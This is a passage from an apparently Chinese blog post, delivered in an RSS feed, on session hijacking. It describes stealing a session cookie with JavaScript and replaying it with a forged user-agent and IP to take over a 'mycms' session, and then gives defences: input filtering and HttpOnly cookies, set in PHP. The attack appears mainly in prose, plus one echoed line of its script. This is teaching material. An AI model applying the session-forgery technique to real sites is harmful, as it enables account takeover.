    <span class="k">echo</span> <span class="s2">&quot;var data = </span><span class="si">$out</span><span class="s2">;&quot;</span><span class="p">;</span>
</pre></div>
</code></pre>
<p><strong>代码2.5 伪造session提交</strong></p>
<p>从代码2.5中可以看出，我们伪造了http请求的header内容，吧浏览器中mycms域的cookie原封不动传过去了，同时在header还伪造了user-agent和ip，mycms中在校验session的时候，发现sessionid和user-agent信息都是对的，所以认为session是存在且合法的！至此为止，我们完成了跨站请求攻击。</p>
<h2><a name="3" class="anchor" href="#3"><span class="header-link"></span></a>3.防范</h2>
<p>第二章节中，我们的攻击思路是这样的，我们示例了通过js获取cookie，然后生成一个第三方网站的网络请求，然后再从第三方网站发起一个网络请求到我们自己的网站上。整个更急流程大体是这样的：
<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/hack_process.png" alt="跨站请求流程"><br><strong>图3.1 跨站请求流程</strong></p>
<p>从图3.1可以看出，让整个流程无法进行下去的措施有两个，一个就是加强对提交信息和页面显示信息的过滤，让非法提交内容无处施展；第二个就是让存储在cookie中的sessionid不能被js读取到，这样即使第一步出现漏洞的情况下，依然不会被攻击者走完整个攻击流程。<br>在php中设置sessionid的httponly属性的方法有很多，具体可以参考 stackoverflow上的一个<a href="http://stackoverflow.com/questions/36877/how-do-you-set-up-use-httponly-cookies-in-php">提问</a>。jsp中也是有很多方法，可以参考开源中国红薯发表的一篇<a href="http://www.oschina.net/question/12_72706">文章</a>。这里仅仅贴出来php中一个解决方法，就是在<code>session_start()</code>之后重新设置一下cookie:    </p>
<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="nv">$sess_name</span> <span class="o">=</span> <span class="nb">session_name</span><span class="p">();</span><span class="c1">//必须在session_start之前调用session_name</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
        <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$sess_name</span><span class="p">,</span> <span class="nb">session_id</span><span class="p">(),</span> <span class="k">null</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>代码3.1 设置httponly属性为true</strong></p>
<p>本文源代码地址：<a href="http://git.oschina.net/yunnysunny/hack">源码git库</a></p>
]]></description><link>http://blog.whyun.com/posts/session/</link><guid isPermaLink="true">http://blog.whyun.com/posts/session/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Sun, 25 May 2014 00:00:00 GMT</pubDate></item></channel></rss>